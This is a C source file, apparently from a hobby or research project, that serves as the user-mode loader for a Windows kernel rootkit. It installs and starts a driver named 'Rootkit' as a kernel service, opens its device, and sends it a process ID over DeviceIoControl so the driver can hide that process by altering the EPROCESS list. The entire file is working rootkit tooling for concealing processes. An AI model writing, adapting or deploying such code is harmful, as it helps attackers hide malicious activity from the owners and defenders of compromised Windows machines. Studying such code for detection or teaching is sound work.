#include <Windows.h>
#include "loader.h"


#define SERVICE "Rootkit"
#define DEVICE "\\\\.\\Rootkit"
#define DRIVER "C:\\Windows\\System32\\drivers\\Rootkit.sys"


// IRP code that will call our rootkit functionality
#define IRP_ROOTKIT_CODE 0x815

int call_kernel_driver(char * pid, HANDLE hDevice)
{
    printf("%s %d\n", "[+] Calling Driver, hiding PID:", atoi(pid));

    ULONG bytes_returned;
    char retbuf[250];

    BOOLEAN call_result = DeviceIoControl(
        hDevice,
        IRP_ROOTKIT_CODE,
        pid,
        (DWORD) strlen(pid) + 1,
        retbuf,
        250,
        &bytes_returned,
        (LPOVERLAPPED) NULL);

    if (!call_result) {
        printf("[-] Error sending IRP to driver: %s \n", GetLastErrorAsString());
        return 0;
    }

    printf("[+] IRP Sent, look for your process!\n");
    printf("\nRootkit returned '%s'\n", retbuf);

    return 0;
}

BOOL load_driver(SC_HANDLE svcHandle) {

    printf("[*] Loading driver.\n");

    // Attempt to start the service
    if(StartService(svcHandle, 0, NULL) == 0) {

        // Check if error was due to the driver already running
        if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {

            printf("[!] Driver is already running.\n");
            return TRUE;

        } else {
            printf("[-] Error loading driver: %s \n", GetLastErrorAsString());
            return FALSE;
        }
    }

    printf("[+] Driver loaded.\n");
    return TRUE;
}

HANDLE install_driver() {

    // Declare variables
    SC_HANDLE hSCManager = NULL;   // Handle for SCM Database
    SC_HANDLE hService = NULL;     // Service handle 
    HANDLE hDevice = NULL;         // Device handle for our driver
    
    // Open a handle to the sc.exe service manager
    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    // Check the return value of our handle
    if (hSCManager == NULL) {
        printf("[-] Error opening handle to SCM Database: %s \n", GetLastErrorAsString());
        goto cleanup;
    }

    printf("[*] Grabbing driver device handle...\n");

    // Try to open a handle to our service
    hService = OpenService(hSCManager, TEXT(SERVICE), SERVICE_ALL_ACCESS); 

    // If it doesn't open successfully, try to create it as a new service
    if(hService == NULL) 
    {
        printf("[!] Doesn't exist, installing new SCM entry...\n");

        // Check if it's because it isn't already installed
        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) 
        {
            // Create the service
            hService = CreateService 
            (
                hSCManager,
                TEXT(SERVICE),
                TEXT(SERVICE),
                SC_MANAGER_ALL_ACCESS,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE,
                TEXT(DRIVER),
                NULL, NULL, NULL, NULL, NULL
            );

            if (hService == NULL) 
            {
                printf("[-] Error creating service: %s \n", GetLastErrorAsString());
                goto cleanup;
            }

        } else {
            printf("[-] Error opening service: %s \n", GetLastErrorAsString());
            goto cleanup;
        }
    
        printf("[+] SCM database entry added.\n");

        // Attempt to start newly added driver
        if(!load_driver(hService))
            goto cleanup;
    }

    // Open Device handle
    hDevice = CreateFile 
    (  
        TEXT(DEVICE),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    // Check to ensure a valid handle
    if (hDevice == INVALID_HANDLE_VALUE) 
    {
        // Check if installed driver didn't start properly
        if(!load_driver(hService)){
            printf("[-] Error creating handle: %s \n", GetLastErrorAsString());
            hDevice = NULL;
            goto cleanup;
        }
    }

// Cleanup and return
// I debated a long time about the using a goto here, I didn't want to type the
// cleanup routine everytime I wanted to return after an error.
// Linus and Rik van Riel convinced me it was okay: 
// http://web.archive.org/web/20100211132600/http://kerneltrap.org/node/553/2131
// I guess memory cleanup and non-nested conditionals like we have above are 
// one of the only times using the notorious goto isn't a crime against humanity
cleanup: 
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    if(hDevice)
        return hDevice;

    return NULL;
}

int main(int argc, char *argv[])
{
    // Device handle
    HANDLE hDevice; 

    // Usage
    if ( argc != 2) 
    {
        printf("Usage Error: "
                "\nPlease provide pid to hide\n");
        exit(EXIT_FAILURE);
    }
    
    unsigned int pid = atoi(argv[1]);

    printf("\n[+] Discovered PID of process : %d\n", pid);
    
    // Grab handle to our rootkit driver
    hDevice = install_driver();

    // Exit if there was an error
    if (hDevice == NULL) 
        exit(1);

    printf("[+] Recieved driver handle.\n");

    // Convert PID to buffer to pass to driver
    char buffer[10];
    sprintf_s(buffer, 10, "%ld", pid);

    // Call driver to modify the EPROCESS list
    call_kernel_driver(buffer, hDevice);

    CloseHandle(hDevice);
    return 0;
}